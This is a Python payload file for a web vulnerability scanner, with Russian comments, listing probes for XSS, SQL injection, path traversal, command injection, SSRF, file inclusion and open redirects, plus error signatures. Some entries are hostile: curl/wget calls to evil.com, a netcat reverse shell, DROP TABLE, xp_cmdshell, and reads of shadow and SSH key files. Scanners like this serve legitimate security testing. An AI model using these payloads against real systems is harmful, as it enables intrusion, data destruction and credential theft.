# scanner/payloads.py
# Полезные нагрузки и сигнатуры для поиска уязвимостей

# Заголовки для HTTP-запросов
HEADERS = {
    "User-Agent": "AdvancedScanner/5.1",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive"
}

# Полезные нагрузки для XSS (расширенный список)
XSS_PAYLOADS = [
    # Базовые XSS
    "<svg/onload=window.xssFlag=1>",
    "<img src=x onerror=window.xssFlag=1>",
    "\"'><script>window.xssFlag=1</script>",
    "<body onload=window.xssFlag=1>",
    "<iframe srcdoc='<script>window.xssFlag=1</script>'></iframe>",
    "javascript:window.xssFlag=1",
    "onmouseover=window.xssFlag=1",
    # Дополнительные теги и атрибуты
    "<script>window.xssFlag=1</script>",
    "<script src='javascript:window.xssFlag=1'></script>",
    "<img src='x' onerror='window.xssFlag=1'>",
    "<video onerror='window.xssFlag=1' src='x'></video>",
    "<audio onerror='window.xssFlag=1' src='x'></audio>",
    "<details open ontoggle='window.xssFlag=1'>",
    "<input onfocus='window.xssFlag=1' autofocus>",
    "<textarea onfocus='window.xssFlag=1' autofocus>",
    "<select onchange='window.xssFlag=1'><option>1</option></select>",
    "<marquee onstart='window.xssFlag=1'>test</marquee>",
    # Обход фильтров
    "<scr<script>ipt>window.xssFlag=1</script>",
    "<img src=x onerror=&#119;&#105;&#110;&#100;&#111;&#119;&#46;&#120;&#115;&#115;&#70;&#108;&#97;&#103;&#61;&#49;>",
    "jaVasCript:window.xssFlag=1",
    "data:text/html,<script>window.xssFlag=1</script>",
    "vbscript:Execute('window.xssFlag=1')",
    # HTML-кодирование
    "&lt;script&gt;window.xssFlag=1&lt;/script&gt;",
    "&#x3C;script&#x3E;window.xssFlag=1&#x3C;/script&#x3E;",
    # Другие векторы
    "<meta http-equiv='refresh' content='0;url=javascript:window.xssFlag=1'>",
    "<object data='javascript:window.xssFlag=1'></object>",
    "<embed src='javascript:window.xssFlag=1'>",
    "<form><button formaction='javascript:window.xssFlag=1'>Click</button></form>",
    "<isindex type=image src=1 onerror=window.xssFlag=1>",
    "<base href='javascript:window.xssFlag=1//'>",
]

# Полезные нагрузки для SQL-инъекций (расширенный список)
SQLI_PAYLOADS = [
    # Базовые SQL-инъекции
    "' OR 1=1-- ",
    "' OR '1'='1'-- ",
    "' UNION SELECT NULL,NULL--",
    "'||(SELECT 1 WHERE 1=1)-- ",
    "1; IF(1=1) WAITFOR DELAY '0:0:5'--",
    "1) OR SLEEP(5)#",
    # Дополнительные SQL-инъекции
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM users--",
    "' OR '1'='1' /*",
    "') OR ('1'='1'--",
    "1 AND 1=1--",
    "1 OR 1=1 LIMIT 1--",
    "' AND 1=2 UNION SELECT 1,2--",
    "1; EXEC xp_cmdshell('whoami')--",
    "1 WAITFOR DELAY '0:0:5'--",
    "1 OR IF(1=1, SLEEP(5), 0)--",
    "') OR ('1'='1' #",
    "' OR EXISTS(SELECT * FROM users WHERE 1=1)--",
    "' OR 1=1 INTO OUTFILE '/tmp/test'--",
    "' OR 1=1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x5c,0x7171717171)),1)--",
    # Обход фильтров
    "'%20OR%201=1--",
    "'/**/OR/**/1=1--",
    "'+OR+1=1--",
    "' OR 1=1%0A--",
    "' OR 1=1%0D--",
    "1 AND 1=1 ORDER BY 1--",
    "' OR '1'='1' LIMIT 1 OFFSET 0--",
    "1; SELECT * FROM information_schema.tables--",
    "1; SHOW TABLES--",
    "1 AND SUBSTR((SELECT database()),1,1)='t'--",
]

# Полезные нагрузки для обхода пути (расширенный список)
PATH_TRAVERSAL_PAYLOADS = [
    # Базовые
    "../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    # Вариации для обхода фильтров
    "/....//....//etc/passwd",
    "\\..\\..\\..\\windows\\system32\\config\\sam",
    "/var/www/html../../../../etc/passwd",
    "/etc/passwd%00",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../../../../../proc/self/environ",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/proc/self/stat",
    "/proc/self/status",
    "/proc/self/cmdline",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access_log",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
    "/etc/httpd/conf/httpd.conf",
    "../../../../../../../../boot.ini",
    "../../../../../../../../etc/mysql/my.cnf",
]

# Полезные нагрузки для инъекции команд ОС (расширенный список)
OS_CMD_PAYLOADS = [
    # Базовые
    "test;id",
    "$(id)",
    "`id`",
    # Дополнительные команды
    ";whoami",
    "|whoami",
    "&whoami",
    "&&whoami",
    ";cat /etc/passwd",
    "|cat /etc/passwd",
    "&&cat /etc/passwd",
    ";ls -la",
    "|ls -la",
    "$(whoami)",
    "`whoami`",
    ";ping -c 1 127.0.0.1",
    "|ping -c 1 127.0.0.1",
    ";curl http://evil.com",
    "|curl http://evil.com",
    ";wget http://evil.com -O /tmp/test",
    "|wget http://evil.com -O /tmp/test",
    ";bash -c 'whoami'",
    "|bash -c 'whoami'",
    ";sh -c 'whoami'",
    ";nc -e /bin/sh 127.0.0.1 4444",
    "|nc -e /bin/sh 127.0.0.1 4444",
    ";powershell -c whoami",
    "|powershell -c whoami",
    ";cmd.exe /c dir",
    "|cmd.exe /c dir",
    ";echo $PATH",
    "|echo $PATH",
]

# Полезные нагрузки для SSRF (расширенный список)
SSRF_PAYLOADS = [
    # Базовые
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
    "http://localhost:80/",
    # Дополнительные векторы
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:5432/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:11211/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/api/token",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://[::1]:80/",
    "file:///etc/passwd",
    "ftp://127.0.0.1/",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
    "dict://127.0.0.1:6379/info",
    "http://127.0.0.1:9200/_cluster/health",
    "http://127.0.0.1:5601/api/status",
    "http://127.0.0.1:9092/",
    "http://127.0.0.1:2181/leader",
    "http://internal-service.local:80/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
]

# Полезные нагрузки для LFI/RFI (расширенный список)
LFI_RFI_PAYLOADS = [
    # Базовые LFI
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "http://evil.com/malicious.php",
    "../../../../../../../../windows/system32/drivers/etc/hosts",
    # Дополнительные LFI
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/stat",
    "/proc/self/status",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "/var/log/httpd/access_log",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
    "/etc/httpd/conf/httpd.conf",
    "/etc/mysql/my.cnf",
    "/etc/php.ini",
    "/etc/fstab",
    "/root/.bash_history",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/id_rsa",
    "/var/www/html/config.php",
    "/var/www/html/wp-config.php",
    "/var/www/html/.env",
    # Обходы фильтров
    "/etc/passwd%00",
    "/....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=config.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=",
    "expect://id",
    "php://input",
    "file:///etc/passwd",
    # RFI
    "http://evil.com/shell.php",
    "https://malicious.com/backdoor.php",
    "ftp://evil.com/malicious.php",
]

# Полезные нагрузки для HTTP Parameter Pollution (расширенный список)
HPP_PAYLOADS = [
    # Базовые
    "polluted",
    "1&polluted=2",
    "admin=true",
    # Дополнительные
    "id=1&id=2",
    "user=admin&user=guest",
    "role=user&role=admin",
    "action=delete&action=view",
    "token=abc&token=xyz",
    "cmd=ls&cmd=whoami",
    "page=1&page=2",
    "sort=asc&sort=desc",
    "lang=en&lang=fr",
    "debug=false&debug=true",
    "id=1;id=2",
    "key=value1&key=value2",
    "param[]=1&param[]=2",
    "test=1%26test=2",
]

# Полезные нагрузки для Open Redirect (расширенный список)
OPEN_REDIRECT_PAYLOADS = [
    # Базовые
    "//evil.com",
    "https://trusted.com/evil.com",
    "http://example.com",
    "/redirect?url=http://malicious.com",
    # Дополнительные
    "//malicious.com",
    "https://trusted.com//evil.com",
    "http://evil.com/",
    "/?next=http://malicious.com",
    "/?url=https://evil.com",
    "/?redirect=https://malicious.com",
    "/?goto=http://evil.com",
    "/redirect?to=http://malicious.com",
    "/redir?url=http://evil.com",
    "//evil.com%2F",
    "http://evil.com%2F",
    "/\\evil.com",
    "javascript:window.location='http://evil.com'",
    "data:text/html,<script>window.location='http://evil.com'</script>",
    "%2f%2fevil.com",
    "%68%74%74%70%3a%2f%2fevil.com",
    "http://evil.com#@trusted.com",
    "http://trusted.com@evil.com",
    "http://evil.com:80@trusted.com",
    "/redirect?destination=http://malicious.com",
]

# Полезные нагрузки для фаззинга заголовков (расширенный список)
HEADER_FUZZ_PAYLOADS = [
    # Базовые
    "<script>window.xssFlag=1</script>",
    "http://evil.com",
    "' OR 1=1-- ",
    "../../etc/passwd",
    # Дополнительные
    "javascript:window.xssFlag=1",
    "<svg/onload=window.xssFlag=1>",
    "onerror=window.xssFlag=1",
    "' UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:5'--",
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80/",
    "file:///etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "cmd.exe /c dir",
    ";id",
    "|whoami",
    "$(whoami)",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=",
    "http://evil.com#@trusted.com",
    "http://trusted.com@evil.com",
    "%2f%2fevil.com",
    "'/**/OR/**/1=1--",
    "../../../../../../../../etc/passwd%00",
    "id=1&id=2",
    "/redirect?url=http://malicious.com",
]

# Общие параметры для фаззинга (расширенный список)
FUZZ_PARAMS = [
    # Базовые
    "<script>window.xssFlag=1</script>",
    "' OR 1=1-- ",
    "../../../etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    # Дополнительные
    "<svg/onload=window.xssFlag=1>",
    "<img src=x onerror=window.xssFlag=1>",
    "javascript:window.xssFlag=1",
    "' UNION SELECT NULL--",
    "1 WAITFOR DELAY '0:0:5'--",
    "1 OR SLEEP(5)--",
    "' OR '1'='1' /*",
    "'%20OR%201=1--",
    "'/**/OR/**/1=1--",
    "../../../../../../../../etc/passwd%00",
    "/....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "http://127.0.0.1:80/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
    ";whoami",
    "|whoami",
    "$(whoami)",
    "`whoami`",
    ";cat /etc/passwd",
    ";curl http://evil.com",
    "id=1&id=2",
    "admin=true",
    "//evil.com",
    "https://trusted.com/evil.com",
    "/redirect?url=http://malicious.com",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=",
    "expect://id",
    "http://evil.com#@trusted.com",
    "http://trusted.com@evil.com",
]

# Сигнатуры ошибок для SQL-инъекций (расширенный список)
ERROR_SIGS_SQL = [
    "SQL syntax", "mysql_fetch", "ORA-", "syntax error at or near", "unclosed quotation",
    "MySQL server version", "PostgreSQL", "sqlite3", "SQLITE", "Microsoft SQL Server",
    "ODBC SQL", "DB2", "You have an error in your SQL", "unexpected end of SQL",
    "SQL command not properly ended", "unknown column", "table or view does not exist",
    "division by zero", "SQLSTATE", "HY000", "42000", "42S02", "1064", "1054",
    "near \")\": syntax error", "invalid query", "Incorrect syntax near",
]

# Сигнатуры ошибок для обхода пути (расширенный список)
ERROR_SIGS_PATH = [
    "root:x:0:0:", "[drivers]", "No such file or directory",
    "dir:", "file:", "path:", "Permission denied", "dir (",
    "/etc/passwd", "/etc/shadow", "hosts", "win.ini", "boot.ini",
    "not accessible", "directory traversal", "path traversal",
    "invalid file path", "file not found", "access denied",
]

# Сигнатуры ошибок для инъекции команд ОС (расширенный список)
ERROR_SIGS_OS = [
    "uid=", "gid=", "root:x", "whoami", "dir",
    "bash:", "sh:", "cmd.exe", "powershell", "command not found",
    "id", "cat", "ls", "echo", "ping", "curl", "wget",
    "nc: command", "netcat", "executed successfully",
    "system command", "execution result", "output:",
]

# Сигнатуры ошибок для LFI/RFI (расширенный список)
ERROR_SIGS_LFI = [
    "root:x:0:0:", "php://filter", "include_path", "failed to open stream",
    "/etc/passwd", "/etc/shadow", "hosts", "config.php", "wp-config.php",
    "open_basedir restriction", "file inclusion", "local file inclusion",
    "remote file inclusion", "include(", "require(", "fopen(",
    "Permission denied", "No such file", "file_get_contents(",
    "stream failed", "base64 encoded", "data://", "expect://",
]

# Карта уровней серьезности уязвимостей (без изменений)
SEVERITY_MAP = {
    "XSS": "High",
    "SQL Injection": "Critical",
    "SQL Injection (time-based)": "Critical",
    "SQL Injection (fuzz)": "High",
    "Path Traversal": "High",
    "Path Traversal (fuzz)": "High",
    "OS Command Injection": "Critical",
    "OS Command Injection (fuzz)": "Critical",
    "SSRF": "Critical",
    "CSRF": "Medium",
    "IDOR": "High",
    "LFI/RFI": "High",
    "HTTP Parameter Pollution": "Medium",
    "Open Redirect": "Medium",
    "Sensitive File/Dir Found": "Low",
    "Insecure HTTP Methods": "Medium",
    "Unencrypted connection": "Medium",
}